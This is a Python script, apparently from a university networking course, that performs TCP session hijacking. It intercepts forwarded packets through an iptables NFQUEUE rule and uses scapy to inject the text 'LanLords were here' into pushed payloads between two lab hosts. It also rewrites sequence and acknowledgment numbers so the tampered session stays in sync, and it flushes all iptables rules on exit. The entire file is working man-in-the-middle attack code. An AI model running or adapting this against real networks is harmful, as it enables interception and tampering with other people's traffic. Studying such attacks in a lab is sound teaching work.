import os
from scapy.all import IP, TCP, scapy, send
from netfilterqueue import NetfilterQueue

# Flag TCP pentru PSH (Push Function) - trimite pachetul la destinatar
PSH = 0x08

# IP-urile clientului și serverului
client_ip = "198.7.0.1"
server_ip = "198.7.0.2"

# Dicționare pentru a ține evidența seq și ack care au fost alterate
hacked_seq = dict()
hacked_ack = dict()

def alter_packages(packet):
    global client_ip
    global server_ip
    global hacked_seq
    global hacked_ack

    # Obținem payload-ul pachetului
    octets = packet.get_payload()
    scapy_packet = IP(octets)

    # Verificăm dacă pachetul este de tip TCP și dacă este trimis de la client sau server
    if scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == client_ip or scapy_packet[IP].src == server_ip):
        flags = scapy_packet['TCP'].flags
        old_seq = scapy_packet['TCP'].seq
        old_ack = scapy_packet['TCP'].ack
        # verificăm dacă seq sau ack au fost alterate anterior
        new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
        new_ack = hacked_ack[old_ack] if old_ack in hacked_ack.keys() else old_ack

        print("Old Seq: ", old_seq, " New Seq: ", new_seq)
        print("Old Ack: ", old_ack, " New Ack: ", new_ack)

        print("Before hacking") 
        print(scapy_packet.show2())

        original_msg = scapy_packet['TCP'].payload
        hacked_msg = scapy_packet['TCP'].payload

        # dacă flag-ul pentru PSH este setat, înlocuim mesajul cu un mesaj modificat
        if flags & PSH:
            hacked_msg = scapy.packet.Raw(b'LanLords were here ( . Y . ) ' + bytes(scapy_packet['TCP'].payload))

        # actualizăm lungimea mesajului
        original_length = old_seq + len(original_msg)
        hacked_length = new_seq + len(hacked_msg)

        # actualizăm dicționarele cu noile valori pentru seq și ack găsite
        hacked_seq[original_length] = hacked_length
        hacked_ack[hacked_length] = original_length

        # construim pachetul modificat cu noile valori pentru seq și ack și mesajul modificat
        hacked_packet = IP(src=scapy_packet[IP].src, dst=scapy_packet[IP].dst
            ) / TCP(
            sport=scapy_packet['TCP'].sport, 
            dport=scapy_packet['TCP'].dport, 
            flags=scapy_packet['TCP'].flags,
            seq=new_seq, 
            ack=new_ack) / (hacked_msg)

        print("After hacking")
        print(hacked_packet.show2())

        # trimitem pachetul modificat
        send(hacked_packet)
    else:
        send(scapy_packet)

# Funcția care se ocupă de interceptarea pachetelor
def connect_to_queue():
    print("TCP Hijack Started")
    queue = NetfilterQueue()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10") # se adaugă un rule pentru a trimite pachetele la coada 10
        queue.bind(10, alter_packages) # se apelează funcția alter_packages pentru fiecare pachet
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush") # se șterge rule-ul
        queue.unbind()
        print("TCP Hijack Stopped")

if __name__ == '__main__':
    connect_to_queue()



# sursa: https://github.com/DariusBuhai/FMI-Unibuc/blob/main/Year%20II/Semester%202/Retele%20de%20calculatoare